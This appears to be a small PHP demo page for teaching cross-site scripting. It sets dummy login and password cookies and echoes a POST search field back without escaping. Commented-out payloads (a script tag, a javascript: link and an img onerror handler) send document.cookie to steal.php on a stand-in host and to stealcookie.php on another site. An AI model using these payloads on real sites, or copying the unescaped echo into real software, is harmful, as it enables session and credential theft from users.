<?php
	setcookie('login', 'admin');
	setcookie('pswd', 'abc456');
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>XSS</title>
<style> textarea {background: #eef;  border: solid 1px;} </style>
<script> 	//location.href = "http://www.developerthai.com/stealcookie.php?"+document.cookie; </script>
</head>

<body>
<?php
if($_POST['kw']) {
	echo "คุณกำลังค้นหา: " . stripslashes($_POST['kw']);
}	
?>
<form method="post">
	Status:<br><textarea name="status"></textarea><br><button>Post</button>
</form>
</body>
</html>

<!--
<script>location.href='http://www.badsite.com/steal.php?c='+document.cookie;</script>
<a href="javascript: location.href='http://www.badsite.com/steal.php?c='+document.cookie">click</a>
<img src=1 onerror="javascript: location.href='http://www.badsite.com/steal.php?c='+document.cookie">
-->